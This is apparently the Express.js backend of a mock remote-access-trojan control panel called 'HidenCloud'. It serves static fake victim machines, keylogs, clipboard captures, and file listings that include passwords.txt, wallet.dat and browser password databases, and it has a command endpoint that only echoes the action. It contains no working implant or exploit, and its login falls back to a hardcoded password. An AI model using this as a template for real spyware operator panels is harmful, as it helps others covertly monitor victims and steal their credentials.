const path = require("path");
const crypto = require("crypto");
const express = require("express");
const cookieParser = require("cookie-parser");

const app = express();
const PORT = process.env.PORT || 3000;

const USERNAME = process.env.PANEL_USER || "jayjay";
const PASSWORD = process.env.PANEL_PASS || "jayjay100!";

const sessions = new Map();

function safeEqual(a, b) {
  const ab = Buffer.from(String(a));
  const bb = Buffer.from(String(b));
  if (ab.length !== bb.length) return false;
  return crypto.timingSafeEqual(ab, bb);
}

function isAuthed(req) {
  const sid = req.cookies && req.cookies.hc_session;
  return Boolean(sid && sessions.has(sid));
}

app.use(express.json());
app.use(cookieParser());

app.post("/api/login", (req, res) => {
  const { username = "", password = "" } = req.body || {};
  if (!safeEqual(username, USERNAME) || !safeEqual(password, PASSWORD)) {
    return res.status(401).json({ ok: false, error: "Invalid credentials" });
  }
  const sid = crypto.randomBytes(24).toString("hex");
  sessions.set(sid, { user: USERNAME, at: Date.now() });
  res.cookie("hc_session", sid, {
    httpOnly: true,
    sameSite: "lax",
    secure: process.env.NODE_ENV === "production",
    maxAge: 1000 * 60 * 60 * 12,
  });
  res.json({ ok: true, user: USERNAME });
});

app.post("/api/logout", (req, res) => {
  const sid = req.cookies && req.cookies.hc_session;
  if (sid) sessions.delete(sid);
  res.clearCookie("hc_session");
  res.json({ ok: true });
});

app.get("/api/me", (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ ok: false });
  res.json({ ok: true, user: USERNAME });
});

const CLIENTS = [
  {
    id: "HC-9F21A",
    name: "DESKTOP-JAY",
    user: "jay",
    os: "Windows 11 Pro",
    ip: "192.168.1.42",
    country: "Sweden",
    countryCode: "SE",
    status: "online",
    lastSeen: "just now",
    cpu: "Intel i7-13700K",
    ram: "32 GB",
    gpu: "RTX 4070 Ti",
    uptime: "3h 12m",
    group: "Personal",
    av: "Windows Defender",
    netSpeed: "85 Mbps",
    installed: "2025-12-01",
  },
  {
    id: "HC-3B7E2",
    name: "LAPTOP-ADMIN",
    user: "admin",
    os: "Windows 10 Enterprise",
    ip: "10.0.0.15",
    country: "Germany",
    countryCode: "DE",
    status: "online",
    lastSeen: "2m ago",
    cpu: "AMD Ryzen 9 5900X",
    ram: "64 GB",
    gpu: "RX 6800 XT",
    uptime: "14h 42m",
    group: "Work",
    av: "Kaspersky",
    netSpeed: "120 Mbps",
    installed: "2025-11-18",
  },
  {
    id: "HC-01DC9",
    name: "SERVER-PROD",
    user: "root",
    os: "Ubuntu 22.04 LTS",
    ip: "172.16.0.5",
    country: "Netherlands",
    countryCode: "NL",
    status: "online",
    lastSeen: "just now",
    cpu: "Xeon E-2388G",
    ram: "128 GB",
    gpu: "None",
    uptime: "47d 6h",
    group: "Servers",
    av: "ClamAV",
    netSpeed: "1 Gbps",
    installed: "2025-06-22",
  },
  {
    id: "HC-88FA4",
    name: "WORKSTATION-DEV",
    user: "dev",
    os: "macOS Sonoma 14.4",
    ip: "192.168.2.88",
    country: "United States",
    countryCode: "US",
    status: "offline",
    lastSeen: "3 hours ago",
    cpu: "Apple M3 Max",
    ram: "96 GB",
    gpu: "M3 Max 40-core",
    uptime: "0",
    group: "Work",
    av: "None",
    netSpeed: "0",
    installed: "2026-01-10",
  },
  {
    id: "HC-CC291",
    name: "PC-GAMING",
    user: "player1",
    os: "Windows 11 Home",
    ip: "192.168.3.200",
    country: "Japan",
    countryCode: "JP",
    status: "idle",
    lastSeen: "28m ago",
    cpu: "Intel i9-14900K",
    ram: "64 GB",
    gpu: "RTX 4090",
    uptime: "1h 5m",
    group: "Personal",
    av: "Bitdefender",
    netSpeed: "200 Mbps",
    installed: "2026-03-02",
  },
];

const LOGS = [];
function addLog(type, msg) {
  LOGS.unshift({ id: crypto.randomBytes(4).toString("hex"), type, msg, ts: Date.now() });
  if (LOGS.length > 200) LOGS.length = 200;
}
addLog("info", "Panel started");
addLog("info", "Client HC-9F21A connected from Sweden");
addLog("info", "Client HC-3B7E2 connected from Germany");
addLog("info", "Client HC-01DC9 connected from Netherlands");
addLog("warn", "Client HC-88FA4 went offline");
addLog("info", "Client HC-CC291 entered idle state");
addLog("success", "Screenshot captured from DESKTOP-JAY");
addLog("success", "File listing requested: C:\\Users\\jay");
addLog("info", "Panel login from 127.0.0.1");
addLog("warn", "Suspicious process detected on PC-GAMING: cryptominer.exe");
addLog("success", "Keylog buffer synced from LAPTOP-ADMIN");
addLog("info", "Clipboard captured from SERVER-PROD");

app.get("/api/stats", (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ ok: false });
  const online = CLIENTS.filter((c) => c.status === "online").length;
  const offline = CLIENTS.filter((c) => c.status === "offline").length;
  const idle = CLIENTS.filter((c) => c.status === "idle").length;
  const countries = [...new Set(CLIENTS.map(c => c.country))].length;
  res.json({
    ok: true,
    analytics: {
      total: CLIENTS.length,
      online,
      offline,
      idle,
      countries,
      newToday: 2,
      commandsSent: 147,
      screensCaptured: 34,
      keylogs: 892,
      bandwidth: "2.4 GB",
      avgUptime: "12h 30m",
      threats: 3,
    },
    clients: CLIENTS,
  });
});

app.get("/api/logs", (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ ok: false });
  res.json({ ok: true, logs: LOGS });
});

app.post("/api/logs", (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ ok: false });
  LOGS.length = 0;
  res.json({ ok: true });
});

app.get("/api/client/:id", (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ ok: false });
  const client = CLIENTS.find((c) => c.id === req.params.id);
  if (!client) return res.status(404).json({ ok: false });
  addLog("info", `Admin connected to ${client.name}`);
  res.json({
    ok: true,
    client,
    files: [
      { name: "Desktop", type: "folder", size: "-", modified: "2026-08-19" },
      { name: "Documents", type: "folder", size: "-", modified: "2026-08-20" },
      { name: "Downloads", type: "folder", size: "-", modified: "2026-08-18" },
      { name: "AppData", type: "folder", size: "-", modified: "2026-08-20" },
      { name: "passwords.txt", type: "file", size: "2 KB", modified: "2026-07-14" },
      { name: "screenshot.png", type: "file", size: "412 KB", modified: "2026-08-19" },
      { name: "notes.docx", type: "file", size: "18 KB", modified: "2026-08-15" },
      { name: "wallet.dat", type: "file", size: "64 KB", modified: "2026-06-01" },
      { name: "chrome_passwords.db", type: "file", size: "128 KB", modified: "2026-08-20" },
      { name: "startup.bat", type: "file", size: "1 KB", modified: "2025-12-01" },
    ],
    processes: [
      { pid: 4, name: "System", cpu: "0.1%", mem: "12 MB", status: "running" },
      { pid: 124, name: "explorer.exe", cpu: "1.2%", mem: "82 MB", status: "running" },
      { pid: 3200, name: "chrome.exe", cpu: "8.4%", mem: "640 MB", status: "running" },
      { pid: 5100, name: "discord.exe", cpu: "2.1%", mem: "310 MB", status: "running" },
      { pid: 7788, name: "steam.exe", cpu: "0.3%", mem: "45 MB", status: "running" },
      { pid: 9102, name: "svchost.exe", cpu: "0.2%", mem: "18 MB", status: "running" },
      { pid: 1456, name: "WindowsDefender", cpu: "0.5%", mem: "120 MB", status: "running" },
      { pid: 3301, name: "node.exe", cpu: "3.8%", mem: "220 MB", status: "running" },
      { pid: 4502, name: "spotify.exe", cpu: "1.0%", mem: "170 MB", status: "suspended" },
    ],
    keylogs: [
      { ts: "16:41:02", window: "Chrome - Google", text: "how to reset password" },
      { ts: "16:40:55", window: "Discord", text: "yo check this out lol" },
      { ts: "16:39:11", window: "Notepad", text: "meeting notes: Q3 targets are..." },
      { ts: "16:38:22", window: "Chrome - Gmail", text: "Re: Project update" },
      { ts: "16:35:00", window: "VS Code", text: "const apiKey = \"sk-...\"" },
    ],
    clipboard: [
      { ts: "16:41:10", content: "https://github.com/settings/tokens" },
      { ts: "16:39:30", content: "Password123!" },
      { ts: "16:38:00", content: "SELECT * FROM users WHERE admin=true" },
      { ts: "16:35:45", content: "192.168.1.1" },
    ],
  });
});

app.post("/api/command/:id", (req, res) => {
  if (!isAuthed(req)) return res.status(401).json({ ok: false });
  const client = CLIENTS.find((c) => c.id === req.params.id);
  if (!client) return res.status(404).json({ ok: false });
  const { action } = req.body;
  addLog("info", `Command "${action}" sent to ${client.name}`);
  res.json({ ok: true, result: `Command "${action}" executed on ${client.name}` });
});

app.use(express.static(path.join(__dirname, "public")));

app.get("*", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(PORT, () => {
  console.log(`HidenCloud panel running on http://localhost:${PORT}`);
});
